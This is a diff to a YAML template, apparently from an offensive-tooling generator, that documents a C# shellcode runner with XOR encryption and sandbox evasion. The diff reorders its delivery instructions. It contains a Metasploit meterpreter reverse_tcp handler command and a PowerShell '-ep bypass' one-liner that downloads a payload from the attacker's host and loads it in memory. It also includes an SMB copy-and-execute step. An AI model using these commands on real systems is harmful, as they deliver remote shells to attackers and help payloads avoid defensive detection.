@@ -1,5 +1,5 @@
 meta:
-  name: "Simple Shellcode Runner, XOR (C#)*"
+  name: "Simple Shellcode Runner, XOR (C#)"
   category: "Shellcode Execution"
   description: |
     Simple shellcode runner in C# with XOR encryption and sandbox evasion.
@@ -97,12 +97,20 @@ output:
     msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
     ```
 
-    # Transfer and Execute
+    # In-Memory Execution
 
     **Attacker:**
     ```bash
     python3 -m http.server 80
     ```
+
+    **Target:**
+    ```powershell
+    powershell -ep bypass -c "`$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}:/{{ output_file }}'); `$assem = [System.Reflection.Assembly]::Load(`$data); [rev.Program]::Main()"
+    ```
+
+    # Transfer and Execute
+
     **Attacker:**
     ```bash
     python3 -m http.server 80
@@ -117,24 +125,12 @@ output:
 
     **Attacker:**
     ```bash
-    impacket-smbserver share . -smb2support
+    smbserver.py share . -smb2support
     ```
 
     **Target:**
     ```cmd
     copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }} && {{ output_file }}
-    ```
-
-    # In-Memory Execution
-
-    **Attacker:**
-    ```bash
-    python3 -m http.server 80
-    ```
-
-    **Target:**
-    ```powershell
-    powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}:/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [SimpleRunner.Program]::Main(@())"
     ```
 
     # Notes
